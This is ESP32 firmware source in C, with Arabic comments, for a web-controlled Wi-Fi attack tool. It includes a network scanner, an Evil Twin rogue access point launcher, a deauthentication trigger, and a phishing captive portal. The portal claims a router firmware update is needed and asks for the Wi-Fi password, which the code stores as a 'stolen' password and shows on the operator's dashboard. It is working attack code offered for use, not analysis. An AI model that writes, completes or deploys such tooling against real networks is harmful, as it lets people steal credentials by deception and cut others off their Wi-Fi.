#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_http_server.h>
#include "evil_twin.h"
#include "deauther.h"
#include "target.h"
#include "wifiMng.h"

static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;

// متغير لحفظ كلمة المرور التي يتم سرقتها
static char stolen_password[64] = "None";

// متغير لمعرفة ما إذا كان الهجوم نشطاً
static bool is_attack_active = false;

// صفحة لوحة التحكم الخاصة بك (Dashboard)
const char *dashboard_html = 
"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<title>ESP32 Pentest Dashboard</title>"
"<style>body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:10px;}"
"h1{color:#00ffcc;} .btn{background:#4444ff;color:white;padding:12px 20px;text-decoration:none;display:inline-block;font-size:14px;margin:4px;cursor:pointer;border-radius:6px;border:none;}"
".btn-danger{background:#ff4444;} .btn-success{background:#44aa44;}"
".card{background:#2a2a2a;padding:15px;margin:10px auto;border-radius:10px;max-width:400px;}"
"input{padding:10px;border-radius:5px;border:none;margin:10px;width:80%;max-width:300px;}</style></head>"
"<body><h1>ESP32 Pentest Tools</h1>"

"<div class='card'><h2>1. Scan Networks</h2>"
"<button class='btn' onclick='fetch(\"/scan\").then(r=>r.text()).then(t=>document.getElementById(\"scan-res\").innerHTML=t)'>Start Scan</button>"
"<div id='scan-res' style='color:#ffcc00; font-size:12px;'>Click Scan to find networks...</div></div>"

"<div class='card'><h2>2. Evil Twin</h2>"
"<form action='/start_eviltwin' method='get'>"
"<input type='text' name='ssid' placeholder='Target SSID (Must match scan)' required>"
"<input type='text' name='bssid' placeholder='Target BSSID (e.g., AA:BB:CC:DD:EE:FF)' required>"
"<input type='number' name='channel' placeholder='Channel (1-13)' required>"
"<input type='submit' class='btn btn-danger' value='Start Evil Twin'></form></div>"

"<div class='card'><h2>3. Deauther</h2>"
"<form action='/start_deauth' method='get'>"
"<input type='text' name='bssid' placeholder='Target BSSID' required>"
"<input type='submit' class='btn btn-danger' value='Start Deauth'></form></div>"

"<div class='card'><h2>4. Stolen Credentials</h2>"
"<p style='color:#ffcc00;'>Password: <b>{PASSWORD}</b></p></div>"

"<div class='card'><h2>5. Stop All Attacks</h2>"
"<button class='btn btn-success' onclick='fetch(\"/stop\")'>Stop & Return to Safe Mode</button></div>"
"</body></html>";

// صفحة التصيد (Portal) التي ستظهر للضحايا
const char *portal_html = 
"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<title>Router Update Required</title>"
"<style>body{font-family:sans-serif;background:#f0f0f0;color:#333;text-align:center;padding:50px;}"
"h1{color:#d9534f;} .card{background:#fff;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:400px;margin:auto;}"
"input{padding:12px;border-radius:5px;border:1px solid #ccc;margin:10px;width:80%;}"
".btn{background:#0275d8;color:white;padding:12px 20px;border:none;cursor:pointer;border-radius:5px;width:88%;}"
"</style></head>"
"<body><div class='card'>"
"<h1>&#9888; Router Security Update</h1>"
"<p>Your router requires a firmware update to fix a critical vulnerability. Please enter your Wi-Fi password to continue.</p>"
"<form action='/submit_password' method='get'>"
"<input type='password' name='password' placeholder='Enter Wi-Fi Password' required>"
"<input type='submit' class='btn' value='Update Router'>"
"</form></div></body></html>";

// دالة عرض لوحة التحكم (مع استبدال كلمة المرور)
static esp_err_t index_handler(httpd_req_t *req) {
    char *response = malloc(4096);
    strcpy(response, dashboard_html);
    
    // استبدال {PASSWORD} بكلمة المرور المسروقة
    char *pos = strstr(response, "{PASSWORD}");
    if (pos) {
        char temp[4096];
        strncpy(temp, response, pos - response);
        temp[pos - response] = '\0';
        strcat(temp, stolen_password);
        strcat(temp, pos + strlen("{PASSWORD}"));
        strcpy(response, temp);
    }
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}

// دالة عرض صفحة التصيد (Portal)
static esp_err_t portal_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, portal_html, strlen(portal_html));
    return ESP_OK;
}

// دالة استلام كلمة المرور من الضحية
static esp_err_t submit_password_handler(httpd_req_t *req) {
    char buf[100], password[64] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "password", password, sizeof(password));
        strncpy(stolen_password, password, sizeof(stolen_password) - 1);
        ESP_LOGI(TAG, "Stolen Password: %s", stolen_password);
    }
    httpd_resp_send(req, "<h1>Thank you! Your router has been updated.</h1>", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة المسح
static esp_err_t scan_handler(httpd_req_t *req) {
    wifi_scan_config_t scan_config = { .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false };
    esp_wifi_scan_start(&scan_config, true);

    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count == 0) {
        httpd_resp_send(req, "No networks found.", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    
    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
    esp_wifi_scan_get_ap_records(&ap_count, ap_records);

    char *response = malloc(4096);
    strcpy(response, "<b>Found Networks:</b><br>");
    for (int i = 0; i < ap_count && i < 10; i++) {
        char line[150];
        sprintf(line, "SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d<br>",
                (char*)ap_records[i].ssid,
                ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5],
                ap_records[i].primary);
        strcat(response, line);
    }
    free(ap_records);
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}

// دالة بدء Evil Twin
static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
    char buf[200], ssid[32] = {0}, bssid_str[18] = {0}, channel_str[4] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        httpd_query_key_value(buf, "channel", channel_str, sizeof(channel_str));
        
        target_info_t target;
        memset(&target, 0, sizeof(target));
        strncpy(target.ssid, ssid, sizeof(target.ssid) - 1);
        target.channel = atoi(channel_str);
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &target.bssid[0], &target.bssid[1], &target.bssid[2],
               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
               
        evil_twin_start_attack(&target);
        is_attack_active = true; // تفعيل وضع الهجوم
        
        httpd_resp_send(req, "<h1 style='color:red;'>Evil Twin Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة بدء Deauth
static esp_err_t start_deauth_handler(httpd_req_t *req) {
    char buf[100], bssid_str[18] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        target_info_t target;
        memset(&target, 0, sizeof(target));
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &target.bssid[0], &target.bssid[1], &target.bssid[2],
               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
        deauther_send_frames(&target, DEAUTHER_ATTACK_DEAUTH_FRAME);
        httpd_resp_send(req, "<h1 style='color:red;'>Deauth Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة الإيقاف
static esp_err_t stop_handler(httpd_req_t *req) {
    evil_twin_stop_attack();
    deauther_stop();
    is_attack_active = false; // إيقاف وضع الهجوم
    httpd_resp_send(req, "<h1 style='color:green;'>All Attacks Stopped.</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة توجيه الجذر (تقرر ما إذا كانت تعرض لوحة التحكم أم صفحة التصيد)
static esp_err_t root_handler(httpd_req_t *req) {
    if (is_attack_active) {
        // إذا كان الهجوم نشطاً، وجه الضحية إلى صفحة التصيد
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    } else {
        // إذا لم يكن هناك هجوم، اعرض لوحة التحكم الخاصة بك
        return index_handler(req);
    }
}

void http_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 10;

    httpd_uri_t uris[] = {
        {.uri = "/", .method = HTTP_GET, .handler = root_handler},
        {.uri = "/portal", .method = HTTP_GET, .handler = portal_handler},
        {.uri = "/submit_password", .method = HTTP_GET, .handler = submit_password_handler},
        {.uri = "/scan", .method = HTTP_GET, .handler = scan_handler},
        {.uri = "/start_eviltwin", .method = HTTP_GET, .handler = start_eviltwin_handler},
        {.uri = "/start_deauth", .method = HTTP_GET, .handler = start_deauth_handler},
        {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler}
    };

    if (httpd_start(&server, &config) == ESP_OK) {
        for (int i = 0; i < 7; i++) {
            httpd_register_uri_handler(server, &uris[i]);
        }
        ESP_LOGI(TAG, "Full Evil Twin & Portal server started");
    } else {
        ESP_LOGE(TAG, "Failed to start web server");
    }
}

void http_server_stop(void) {
    if (server) {
        httpd_stop(server);
        server = NULL;
    }
}
